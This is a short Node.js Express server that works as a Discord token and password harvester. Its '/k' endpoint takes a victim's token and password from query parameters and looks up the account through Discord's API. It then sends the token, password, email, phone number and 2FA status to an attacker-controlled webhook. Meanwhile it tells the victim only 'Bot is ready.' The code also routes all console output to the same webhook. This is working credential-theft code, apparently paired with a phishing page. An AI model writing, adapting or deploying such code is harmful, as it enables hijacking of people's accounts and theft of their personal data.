const axios = require("axios");
const express = require("express");
const { webhookURL } = require("./config.json");
const { MessageEmbed } = require("discord.js-selfbot-v13");
const app = express();

// Initiating Logged Data Cache
process.logged = [];

Array.prototype.random = function () {
  let n = this[Math.floor(Math.random() * this.length)];
  for (; !n; ) n = this[Math.floor(Math.random() * this.length)];
  return n;
};

const sendToWebhook = async (embed) => {
  try {
    await axios.post(webhookURL, {
      embeds: [embed],
    });
  } catch (error) {
    console.error("Error sending data to webhook:", error);
  }
};

// Override console.log to send logs to webhook
const originalConsoleLog = console.log;
console.log = function (...args) {
  const message = args.map(arg => typeof arg === 'object' ? JSON.stringify(arg, null, 2) : arg).join(' ');
  const embed = new MessageEmbed()
    .setTitle("Console Log")
    .setDescription("```" + message + "```")
    .setColor("#00ff00"); // Green color for logs
  sendToWebhook(embed);
  originalConsoleLog(...args);
};

// Override console.error to send errors to webhook
const originalConsoleError = console.error;
console.error = function (...args) {
  const message = args.map(arg => typeof arg === 'object' ? JSON.stringify(arg, null, 2) : arg).join(' ');
  const embed = new MessageEmbed()
    .setTitle("Console Error")
    .setDescription("```" + message + "```")
    .setColor("#ff0000"); // Red color for errors
  sendToWebhook(embed);
  originalConsoleError(...args);
};

const doxToken = async (tkn, pass) => {
  try {
    const res = await axios({
      url: `https://discord.com/api/v${[8, 9].random()}/users/@me`,
      headers: { Authorization: tkn },
    });

    if (res.status === 200 || res.status === 201) {
      const d = res.data;
      const data = {
        rawData: {
          Token: tkn,
          Pass: pass ? `\`${pass}\`` : "N/A",
          Name: `${d.username}#${d.discriminator}`,
          ID: d.id,
          Email: d.email || `N/A`,
          Phone: d.phone || `N/A`,
          "Bot?": d.bot ? "Yes" : "No",
          "Token Locked?": d.verified ? "No" : "Yes",
          Premium: d.premium_type === 1 ? "Nitro Classic" : d.premium_type === 2 ? "Nitro Booster" : "None",
          "2fa Enabled": d.mfa_enabled ? "Yes" : "No",
          "NSFW Allowed": d.nsfw_allowed ? "Yes" : "No",
          "Banner URL": d.banner ? `https://cdn.discordapp.com/banners/${d.id}/${d.banner}${d.banner.startsWith("a_") ? ".gif" : ".png"}?size=4096` : "N/A",
          "Avatar URL": d.avatar ? `https://cdn.discordapp.com/avatars/${d.id}/${d.avatar}${d.avatar.startsWith("a_") ? ".gif" : ".png"}?size=4096` : "N/A",
        }
      };
      const embed = new MessageEmbed()
        .setTitle("Token Information")
        .setDescription("```json\n" + JSON.stringify(data.rawData, null, 2) + "\n```")
        .setColor("#3498db"); // Blue color for token information
      await sendToWebhook(embed);
      return data;
    }
  } catch (err) {
    console.error(err);
  }
};

// Serve index.html at root URL
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

// Endpoint for token doxing
app.get("/k", async (req, res) => {
  const token = req.query.user;
  const pass = req.query.pass;

  if (token) {
    res.send(`Bot is ready.`);
    doxToken(token, pass);
  } else {
    res.send("Invalid Token");
  }
});

// Start the server
app.listen(8080, 'localhost', () => {
  console.log(`Server Started on http://localhost:8080`);
});
